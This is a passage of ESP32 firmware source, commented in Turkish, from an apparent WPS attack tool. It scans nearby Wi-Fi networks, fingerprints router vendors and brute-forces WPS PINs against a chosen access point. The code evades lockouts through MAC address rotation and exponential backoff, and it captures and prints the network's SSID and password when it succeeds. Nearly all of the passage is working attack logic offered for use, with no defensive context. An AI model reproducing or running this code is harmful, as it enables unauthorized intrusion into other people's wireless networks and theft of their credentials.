      strncpy(wps_pbc_found_ssid, (char *)got.sta.ssid,    32);
      strncpy(wps_pbc_found_pass, (char *)got.sta.password, 64);
      esp_wifi_wps_disable();
      pbc_sm_wps_started   = false;
      wps_pbc_attack_state = WPS_PBC_SUCCESS;
      led_on();
      DEBUG_PRINTF("PBC BASARILI! SSID=%s SIFRE=%s\n",
        wps_pbc_found_ssid, wps_pbc_found_pass);
    } else if (wps_evt_result == -1) {
      // Handshake reddedildi
      esp_wifi_wps_disable();
      pbc_sm_wps_started   = false;
      wps_pbc_attack_state = WPS_PBC_FAILED;
      DEBUG_PRINTLN("PBC handshake NACK - AP reddetti.");
    }
    // wps_evt_result == 0 → devam ediyor
  }
}

// ─── Tarama ───────────────────────────────────────────────────────────────────
void wps_scan() {
  wps_attack_state = WPS_SCANNING;
  wps_target_count = 0;

  int n = WiFi.scanNetworks(false, true, false, 150);
  for (int i = 0; i < n && wps_target_count < WPS_MAX_TARGETS; i++) {
    strncpy(wps_targets[wps_target_count].ssid, WiFi.SSID(i).c_str(), 32);
    memcpy(wps_targets[wps_target_count].bssid, WiFi.BSSID(i), 6);
    wps_targets[wps_target_count].channel = WiFi.channel(i);
    wps_targets[wps_target_count].rssi    = WiFi.RSSI(i);
    wps_vendor_t v = detect_vendor(WiFi.BSSID(i));
    // OUI tablosunda bulunamadıysa SSID adından vendor tahmini yap (2024-2026)
    // Örn: "TP-Link_C80_A1B2" → VENDOR_TPLINK, "ZTE_F670L" → VENDOR_ZTE
    if (v == VENDOR_UNKNOWN) {
      v = detect_vendor_from_ssid(WiFi.SSID(i).c_str());
      if (v != VENDOR_UNKNOWN) {
        DEBUG_PRINTF("SSID vendor tespiti (tarama): %s → vendor=%d\n",
                     WiFi.SSID(i).c_str(), (int)v);
      }
    }
    wps_targets[wps_target_count].vendor  = v;
    wps_targets[wps_target_count].vuln    = assess_vuln(v);
    wps_target_count++;
  }
  WiFi.scanDelete();
  wps_attack_state = WPS_IDLE;
}

// ─── Saldırıyı başlat ─────────────────────────────────────────────────────────
void wps_start_attack(int target_index) {
  if (target_index < 0 || target_index >= wps_target_count) return;
  wps_tgt_idx        = target_index;
  wps_attempt        = 0;
  wps_evt_result     = 0;
  wps_consec_fail    = 0;
  wps_lockout_until  = 0;
  wps_lockout_count  = 0;
  wps_found_pin[0]   = '\0';
  wps_found_ssid[0]  = '\0';
  wps_found_pass[0]  = '\0';
  wps_profile_idx    = 0;   // Her saldırıda profil rotasyonunu sıfırla

  wps_vendor_t vendor = wps_targets[target_index].vendor;

  // Vendor adını ayarla (apply_vendor_name yardımcısını kullan)
  apply_vendor_name(vendor);

  // ── Beacon IE yakalama: model/seri/Pixie Dust bilgisi al ─────────────────
  // Promiscuous modda beacon'ı dinle — aynı kanal, bağlantısız, 2.5 saniye.
  // Süre kısaltıldı (5000→2500): Aktif tarama geri dönüşü kaldırıldığından
  // uzun beklemeye gerek yok; beacon genellikle 100ms içinde gelir.
  // Yakalanamazsa saldırı BSSID/OUI ile devam eder — sorun olmaz.
  DEBUG_PRINTLN("WPS: Beacon IE taraniyor (model/serial icin)...");
  wps_capture_device_info(wps_targets[target_index].bssid,
                          wps_targets[target_index].channel, 2500);
  if (wps_device_info.valid && wps_device_info.ap_setup_locked) {
    DEBUG_PRINTLN("WPS: AP_SETUP_LOCKED=1 tespit edildi! WPS kilitli.");
    // Kilitli olsa da devam et — bazı firmware yanlış rapor eder
  }

  // ── WPS sürüm / PIN desteği / chipset özeti ───────────────────────────────
  if (wps_device_info.valid) {
    uint8_t ver = wps_device_info.wps_version;
    bool pin_ok = (wps_device_info.config_methods == 0) ||   // okunamadı → varsay destekleniyor
                  (wps_device_info.config_methods & 0x0004) ||
                  (wps_device_info.config_methods & 0x0100);
    DEBUG_PRINTF("WPS: v%d.%d | ConfigMethods=0x%04X | PIN=%s | PBC=%s | Chipset=%s\n",
      (ver>>4) ? (ver>>4) : 1, (ver&0xF),
      wps_device_info.config_methods,
      pin_ok                                         ? "evet" : "HAYIR",
      (wps_device_info.config_methods & 0x0080)      ? "evet" : "hayir",
      wps_device_info.chipset_ie_hint[0]             ? wps_device_info.chipset_ie_hint
                                                     : "bilinmiyor");
    if (!pin_ok) {
      DEBUG_PRINTLN("UYARI: AP PIN yontemini desteklemiyor (sadece PBC)! PIN saldirisi basarisiz olabilir.");
    }
  }

  // ── Vendor iyileştirmesi: hangi kaynaktan geldiğini belirle ──────────────
  // Tespit kaynağı önceliği (yüksekten düşüğe):
  //   1. OUI tablosu   — donanım MAC adresi, en güvenilir, HİÇ geçersiz kılınmaz
  //   2. WPS beacon IE — cihazın kendi yayını, kullanıcı değiştiremiyor, güvenilir
  //   3. SSID keyword  — kullanıcı değiştirebilir, en az güvenilir
  //
  // Kural: OUI'dan gelmediyse IE her zaman SSID'i geçersiz kılabilir.
  wps_vendor_t oui_vendor    = detect_vendor(wps_targets[target_index].bssid);
  bool         vendor_fr_oui = (oui_vendor != VENDOR_UNKNOWN);

  if (!vendor_fr_oui && wps_device_info.valid) {
    wps_vendor_t ie_v = detect_vendor_from_ie(wps_device_info);
    if (ie_v != VENDOR_UNKNOWN) {
      const char *kaynak = (vendor == VENDOR_UNKNOWN)
                           ? "OUI+SSID yok, IE tek kaynak"
                           : "SSID uzerini ezdi (IE daha guvenilir)";
      vendor = ie_v;
      wps_targets[target_index].vendor = ie_v;
      wps_targets[target_index].vuln   = assess_vuln(ie_v);
      apply_vendor_name(ie_v);
      DEBUG_PRINTF("WPS IE vendor: %s (%s)\n", wps_vendor_name, kaynak);
    }
  } else if (vendor_fr_oui) {
    DEBUG_PRINTF("Vendor OUI tablosundan dogrulandi: %s — IE/SSID geçersiz kilmaz\n",
                 wps_vendor_name);
  }

  // ── Son çare: SSID adından vendor tespiti ────────────────────────────────
  // OUI ve IE'nin ikisi de başarısız → SSID'den son kez dene.
  // (tarama sırasında zaten denendi ama IE sıfırlamış olabilir)
  if (vendor == VENDOR_UNKNOWN) {
    wps_vendor_t ssid_v = detect_vendor_from_ssid(wps_targets[target_index].ssid);
    if (ssid_v != VENDOR_UNKNOWN) {
      vendor = ssid_v;
      wps_targets[target_index].vendor = ssid_v;
      wps_targets[target_index].vuln   = assess_vuln(ssid_v);
      apply_vendor_name(ssid_v);
      DEBUG_PRINTF("SSID vendor (son care): %s → %s\n",
                   wps_targets[target_index].ssid, wps_vendor_name);
    }
  }

  build_pin_list(wps_targets[target_index].bssid, vendor);

  // ── Adaptif timeout'u sıfırla ─────────────────────────────────────────────
  wps_adaptive_timeout = WPS_PIN_TIMEOUT_MS;
  wps_lockout_delay_ms = WPS_LOCKOUT_DELAY_MS;

  // Mod değişimi YOK — cihaz zaten APSTA modunda başlıyor (main.cpp setup).
  // WiFi.mode(APSTA) çağırmak AP'yi yeniden başlatır ve yönetim ağını keser.
  apply_max_performance();

  // Orijinal MAC'i kaydet, ilk MAC'i al
  esp_wifi_get_mac(WIFI_IF_STA, wps_original_mac);
  memcpy(wps_current_mac, wps_original_mac, 6);

  wps_attack_state = WPS_ATTACKING;
  DEBUG_PRINTF("WPS Saldiri: %s [%s], %d PIN (adaptif timeout: %lums)\n",
    wps_targets[target_index].ssid, wps_vendor_name, wps_total,
    (unsigned long)wps_adaptive_timeout);
}

// ─── Dur ──────────────────────────────────────────────────────────────────────
void wps_stop() {
  esp_wifi_wps_disable();
  esp_wifi_disconnect();

  // Orijinal MAC'i geri yükle
  if (wps_original_mac[0] != 0 || wps_original_mac[1] != 0)
    esp_wifi_set_mac(WIFI_IF_STA, wps_original_mac);

  wps_attack_state   = WPS_STOPPED;
  wps_current_pin[0] = '\0';

  // WIFI_MODE_AP'ye geçiş YOK — APSTA modunda kal, AP kesintisiz çalışır.
  // STA arayüzü pasif kalır; AP "X" hiç kapanmaz.
  apply_max_performance();

  DEBUG_PRINTLN("WPS durduruldu, yonetim AP aktif.");
}

// ─── Ana döngü ────────────────────────────────────────────────────────────────
void wps_loop() {
  if (wps_attack_state != WPS_ATTACKING &&
      wps_attack_state != WPS_LOCKED_OUT) return;

  // ── Lockout bekleme modunda mıyız? (Üstel geri çekilme) ─────────────────
  if (wps_attack_state == WPS_LOCKED_OUT) {
    unsigned long now = millis();
    if (now < wps_lockout_until) {
      web_interface_handle_client();
      delay(50);
      return;
    }
    // Bekleme bitti: MAC rotasyonu + kanalda kısa bekleme
    rotate_sta_mac();
    delay(200);
    // Adaptive timeout'u sıfırla — yeni MAC ile AP taze başlatma yapabilir
    wps_adaptive_timeout = WPS_PIN_TIMEOUT_MS;
    wps_consec_fail      = 0;
    wps_attack_state     = WPS_ATTACKING;
    DEBUG_PRINTF("Lockout bitti (#%d), MAC rotasyonu, yeni timeout=%lums\n",
                 wps_lockout_count, (unsigned long)wps_adaptive_timeout);
    return;
  }

  // ── Tüm PIN'ler tükendi ───────────────────────────────────────────────────
  if (wps_attempt >= wps_total) {
    wps_attack_state = WPS_EXHAUSTED;
    // Mod değişimi YOK — APSTA'da kal, AP kesintisiz çalışır.
    apply_max_performance();
    // Orijinal MAC'i geri yükle
    if (wps_original_mac[0] != 0 || wps_original_mac[1] != 0)
      esp_wifi_set_mac(WIFI_IF_STA, wps_original_mac);
    DEBUG_PRINTLN("WPS: Tum PIN'ler denendi, basari yok.");
    return;
  }

  // ── MAC rotasyonu — her WPS_MAC_ROTATE_EVERY denemede bir ────────────────
  if (wps_attempt > 0 && (wps_attempt % WPS_MAC_ROTATE_EVERY) == 0) {
    rotate_sta_mac();
    delay(80);
  }

  // ── PIN dene ──────────────────────────────────────────────────────────────
  memcpy(wps_current_pin, all_pins[wps_attempt], 9);
  DEBUG_PRINTF("WPS [%d/%d] %s vendor=%s: %s\n",
    wps_attempt + 1, wps_total, wps_vendor_name, "", wps_current_pin);

  unsigned long t_start = millis();
  int8_t result = wps_try_one(
    wps_targets[wps_tgt_idx].bssid,
    wps_targets[wps_tgt_idx].channel,
    wps_current_pin);
  unsigned long t_elapsed = millis() - t_start;

  if (result == 1) {
    // ── BAŞARI ─────────────────────────────────────────────────────────────
    memcpy(wps_found_pin, wps_current_pin, 8);
    wps_found_pin[8] = '\0';
    wps_attack_state = WPS_SUCCESS;
    led_on();
    DEBUG_PRINTF("WPS BASARILI! PIN: %s, SSID: %s, Pass: %s\n",
      wps_found_pin, wps_found_ssid, wps_found_pass);
    // Mod değişimi YOK — APSTA'da kal, AP kesintisiz çalışır.
    apply_max_performance();
    if (wps_original_mac[0] != 0 || wps_original_mac[1] != 0)
      esp_wifi_set_mac(WIFI_IF_STA, wps_original_mac);

  } else if (result == 0) {
    // ── Zaman aşımı → lockout tespiti ──────────────────────────────────────
    // Beklenenden çok çabuk döndüyse AP hızlı bloklama yapıyor demektir.
    // Eşik: adaptif timeout'un %35'inden kısa → hızlı red sayılır.
    uint32_t fast_thresh = wps_adaptive_timeout * 35 / 100;
    if (t_elapsed < fast_thresh) {
      wps_consec_fail++;
      DEBUG_PRINTF("Hizli red [%d/%d]: %lums (esik=%lums)\n",
                   wps_consec_fail, WPS_LOCKOUT_THRESHOLD,
                   t_elapsed, (unsigned long)fast_thresh);
      if (wps_consec_fail >= WPS_LOCKOUT_THRESHOLD) {
        wps_lockout_count++;
        // Üstel geri çekilme: her lockout'ta süre 2x artar (max=WPS_LOCKOUT_DELAY_MAX_MS)
        wps_lockout_delay_ms = min(wps_lockout_delay_ms * 2,
                                   (uint32_t)WPS_LOCKOUT_DELAY_MAX_MS);
        wps_lockout_until = millis() + wps_lockout_delay_ms;
        wps_attack_state  = WPS_LOCKED_OUT;
        DEBUG_PRINTF("LOCKOUT #%d! %lu sn bekleniyor (ustel geri cekilme)\n",
          wps_lockout_count, wps_lockout_delay_ms / 1000);
      }
    } else {
      wps_consec_fail = 0;
    }
    wps_attempt++;

  } else {
    // ── NACK / Normal başarısız ─────────────────────────────────────────────
    wps_consec_fail = 0;
    wps_attempt++;
  }
}
